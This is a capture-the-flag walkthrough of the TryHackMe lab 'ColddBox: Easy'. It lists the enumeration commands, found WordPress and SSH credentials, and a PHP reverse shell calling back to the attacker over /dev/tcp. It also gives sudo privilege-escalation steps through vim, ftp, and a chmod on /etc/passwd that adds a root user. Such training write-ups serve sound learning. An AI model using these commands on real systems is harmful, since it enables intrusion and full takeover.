# ColddBox: Easy

**Room Link:** [https://tryhackme.com/room/colddboxeasy](https://tryhackme.com/room/colddboxeasy)

### Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

### Scan all ports

port 4512 found

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

### TCP/80 - HTTP

**Kali**

```
gobuster dir -u http://$VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
wpscan --url http://$VICTIM/ --enumerate u
```



<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>



```
Username: c0ldd
Password:  9876543210
```



## Reverse Shell

revshell code

```
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/$KALI/443 0>&1'");
?>
```



<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
nc -lvnp 443
```



Then just go to a page that doesn't exist, in this case p=1 existed but p=2 did not.

<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
cat /var/www/html/wpconfig.php
```

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>



### TCP/4512 - SSH

**Victim**

```
ssh c0ldd@$VICTIM -p 4512
Password: cybersecurity
```

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

### Privilege Escalation Option 1 - VIM

**Victim**

```
sudo -l
sudo vim -c ':!/bin/sh'
```

<figure><img src="../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

### Privilege Escalation Option 2 - FTP

**Victim**

```
sudo ftp
!/bin/sh
```

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

### Privilege Escalation Option 3 - chmod

**Victim**

```
ls -lah /etc/passwd
LFILE=/etc/passwd
sudo chmod 6777 $LFILE
ls -lah /etc/passwd
echo 'new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash' >> /etc/passwd
```

**Victim**

```
su new
Password: 123
```

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>





```
```





























































































